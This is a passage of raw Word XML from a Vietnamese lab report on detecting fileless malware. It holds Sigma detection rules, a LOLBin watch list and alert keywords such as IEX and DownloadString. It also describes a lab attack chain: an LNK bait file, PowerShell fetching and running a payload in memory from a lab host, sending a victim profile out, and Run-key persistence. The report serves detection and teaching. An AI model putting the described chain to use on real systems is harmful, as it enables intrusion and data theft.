          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  - Administration scripts</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  - Software deployment</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>level: low</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.4. Registry Run Key Calling PowerShell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>title: Registry Run Key Calling PowerShell</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>id: fileless-lab-registry-run-powershell</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>status: experimental</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>description: Detects a Run key value that launches PowerShell, suitable for persistence simulation detection.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>logsource:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  product: windows</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  category: registry_set</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>detection:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  selection_target:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    TargetObject|contains:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      - '\Software\Microsoft\Windows\CurrentVersion\Run\'</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  selection_value:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    Details|contains:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      - 'powershell.exe'</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      - 'pwsh.exe'</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  condition: selection_target and selection_value</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>falsepositives:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  - Some internal logon scripts</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  - Software update helpers</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>level: medium</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5. Correlation mới là quan trọng</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Một dấu hiệu đơn lẻ có thể chưa đủ kết luận.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Ví dụ:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>PowerShell chạy một mình: có thể bình thường.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>PowerShell kết nối mạng: có thể script quản trị hợp pháp.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>ZIP và LNK tồn tại trong Downloads: có thể người dùng tải file bình thường.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Nhưng nếu trong 1-5 phút có chuỗi:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>User tải ThongBaoLuong_Q3.zip</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; giải nén LNK</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; explorer.exe sinh powershell.exe</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; powershell.exe kết nối 192.168.141.1:8000</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; powershell.exe kết nối 192.168.141.1:8001</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; PowerShell 4104 có Invoke-RestMethod và ScriptBlock::Create</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; attacker nhận POST /collect kèm victim-profile JSON</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; nếu mất mạng, file %TEMP%\FilelessLab\queue\victim-profile-*.json xuất hiện</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; Registry Run key FilelessLabDemo được tạo</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; không có payload file trên disk</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>thì đây là chuỗi đáng ngờ.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6. Phòng thủ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6.1. Bật logging đầy đủ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Nên bật:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Sysmon.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>PowerShell Script Block Logging.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Security Event ID 4688 kèm command line.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Centralized logging về SIEM nếu có.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6.2. Giám sát LOLBins</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Theo dõi các công cụ:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>powershell.exe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>pwsh.exe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>cmd.exe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>wmic.exe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>bitsadmin.exe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>certutil.exe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>rundll32.exe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>regsvr32.exe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>mshta.exe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>wscript.exe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>cscript.exe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Không phải cứ thấy các process này là độc hại. Cần xem command line, parent process, network connection và ngữ cảnh.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6.3. Hạn chế PowerShell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Có thể áp dụng:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>PowerShell Constrained Language Mode.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Chỉ cho phép signed scripts.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Chặn PowerShell version cũ nếu không cần.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Alert khi có </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>EncodedCommand</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>IEX</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>DownloadString</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Invoke-RestMethod</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ScriptBlock::Create</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6.4. AppLocker hoặc WDAC</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Dùng để kiểm soát:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Script nào được chạy.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Binary nào được chạy.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>User nào được phép chạy công cụ nhạy cảm.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6.5. Quản lý email và file nén</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Vì nhiều chuỗi fileless bắt đầu từ phishing hoặc file mồi nhử:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Cảnh báo file ZIP chứa shortcut </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>.lnk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Scan attachment.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Đào tạo người dùng về email giả mạo.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Dùng sandbox email nếu có.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7. Cách viết vào báo cáo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Có thể viết:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360" w:right="216"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Việc phát hiện Fileless Malware không nên dựa duy nhất vào chữ ký file, vì payload có thể không được lưu thành file rõ ràng trên ổ đĩa. Trong bài lab, nạn nhân chỉ tải ZIP và mở shortcut LNK; sau đó PowerShell tải nội dung payload từ máy attacker qua HTTP port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>8000</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, tạo ScriptBlock trong bộ nhớ và thực thi trực tiếp. Các bằng chứng quan trọng gồm Sysmon Event ID 1 cho chuỗi </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>explorer.exe -&gt; powershell.exe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
